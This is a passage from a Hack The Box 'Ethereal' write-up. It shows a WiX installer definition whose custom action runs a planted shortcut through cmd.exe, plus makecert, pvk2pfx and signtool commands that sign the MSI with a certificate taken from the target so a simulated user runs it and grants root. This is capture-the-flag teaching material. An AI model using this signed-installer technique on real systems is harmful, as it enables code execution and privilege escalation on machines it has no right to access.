class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Wix</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.microsoft.com/wix/2006/wi"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Product</span> <span class="attr">Id</span>=<span class="string">"*"</span> <span class="attr">UpgradeCode</span>=<span class="string">"12345678-1234-1234-1234-111111111111"</span> <span class="attr">Name</span>=<span class="string">"Example Product Name"</span></span></span><br><span class="line"><span class="tag"><span class="attr">Version</span>=<span class="string">"0.0.1"</span> <span class="attr">Manufacturer</span>=<span class="string">"@_xpn_"</span> <span class="attr">Language</span>=<span class="string">"1033"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Package</span> <span class="attr">InstallerVersion</span>=<span class="string">"200"</span> <span class="attr">Compressed</span>=<span class="string">"yes"</span> <span class="attr">Comments</span>=<span class="string">"Windows Installer Package"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Media</span> <span class="attr">Id</span>=<span class="string">"1"</span> <span class="attr">Cabinet</span>=<span class="string">"product.cab"</span> <span class="attr">EmbedCab</span>=<span class="string">"yes"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">"TARGETDIR"</span> <span class="attr">Name</span>=<span class="string">"SourceDir"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">"ProgramFilesFolder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">"INSTALLLOCATION"</span> <span class="attr">Name</span>=<span class="string">"Example"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Component</span> <span class="attr">Id</span>=<span class="string">"ApplicationFiles"</span> <span class="attr">Guid</span>=<span class="string">"12345678-1234-1234-1234-222222222222"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Feature</span> <span class="attr">Id</span>=<span class="string">"DefaultFeature"</span> <span class="attr">Level</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ComponentRef</span> <span class="attr">Id</span>=<span class="string">"ApplicationFiles"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Feature</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Property</span> <span class="attr">Id</span>=<span class="string">"cmdline"</span>&gt;</span>cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">"Stage1"</span> <span class="attr">Execute</span>=<span class="string">"deferred"</span> <span class="attr">Directory</span>=<span class="string">"TARGETDIR"</span> <span class="attr">ExeCommand</span>=<span class="string">'[cmdline]'</span> <span class="attr">Return</span>=<span class="string">"ignore"</span></span></span><br><span class="line"><span class="tag"><span class="attr">Impersonate</span>=<span class="string">"yes"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">"Stage2"</span> <span class="attr">Execute</span>=<span class="string">"deferred"</span> <span class="attr">Script</span>=<span class="string">"vbscript"</span> <span class="attr">Return</span>=<span class="string">"check"</span>&gt;</span></span><br><span class="line">fail_here</span><br><span class="line"><span class="tag">&lt;/<span class="name">CustomAction</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">"Stage1"</span> <span class="attr">After</span>=<span class="string">"InstallInitialize"</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">"Stage2"</span> <span class="attr">Before</span>=<span class="string">"InstallFiles"</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Wix</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>We will use <code>candle.exe</code> from wixtools to create a wixobject from <code>msi.xml</code><br><img src="/images/hackthebox/ethereal/65.png" alt=""><br>Then we will use <code>light.exe</code> to create the msi file from the wixobject<br><img src="/images/hackthebox/ethereal/66.png" alt=""><br>After that we need tools from microsoft sdk to sign our msi , first we will use <code>makecert.exe</code> to create new certs from the original certs we got from the box </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">makecert.exe -n &quot;CN&#x3D;Ethereal&quot; -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer</span><br></pre></td></tr></table></figure>
<p>It will ask for a password we will leave it blank for no password protection :<br><img src="/images/hackthebox/ethereal/67.png" alt=""><br><img src="/images/hackthebox/ethereal/68.png" alt=""><br><img src="/images/hackthebox/ethereal/69.png" alt=""><br>Then we will use <code>pvk2pfx.exe</code> to create a pfx for both the cer and the pvk files :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx</span><br></pre></td></tr></table></figure>
<p>And finally we will use <code>signtool.exe</code> to sign the msi with the pfx :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signtool.exe sign &#x2F;f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/70.png" alt=""><br>Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in <code>c:\users\public\desktop\shortcuts\</code> because the msi is just executing that lnk. We will put the msi into <code>D:\DEV\MSIs</code><br><img src="/images/hackthebox/ethereal/71.png" alt=""><br>Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi<br><img src="/images/hackthebox/ethereal/72.png" alt=""><br>And we got root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/access/">Hack The Box - Access</a><br>Next Hack The Box write-up : <a href="/hack-the-box/carrier/">Hack The Box - Carrier</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-03-09</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/firewall/" rel="tag">#firewall</a> <a class="tag-link" href="/tags/ftp/" rel="tag">#ftp</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a> <a class="tag-link" href="/tags/windows/" rel="tag">#windows</a> <a class="tag-link" href="/tags/windows-exploitation/" rel="tag">#windows-exploitation</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
